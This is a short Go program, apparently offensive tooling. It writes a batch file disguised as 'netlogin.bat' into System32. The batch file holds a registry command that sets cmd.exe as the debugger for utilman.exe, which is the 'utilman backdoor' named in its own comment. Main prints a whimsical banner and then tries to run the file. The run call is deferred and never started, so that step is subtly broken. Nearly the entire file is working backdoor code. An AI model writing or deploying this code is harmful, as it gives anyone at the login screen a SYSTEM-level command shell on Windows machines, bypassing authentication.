package main

import (
	"fmt"
	"os"
	"os/exec"
)

//todo

func batchRun() {
	//utilman backdoor & reg touch
	batString2 := "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe\" /f /v Debugger /t REG_SZ /d \"%windir%\\system32\\cmd.exe\""
	f2, _ := os.Create("c:\\Windows\\System32\\netlogin.bat")
	defer f2.Close()
	f2.WriteString(batString2)
}

func main() {
	fmt.Println("BeepBoop Meow Meow")
	fmt.Println("Starting the application...")
	batchRun()
	defer exec.Command("c:\\Windows\\system32\\netlogin.bat")
}
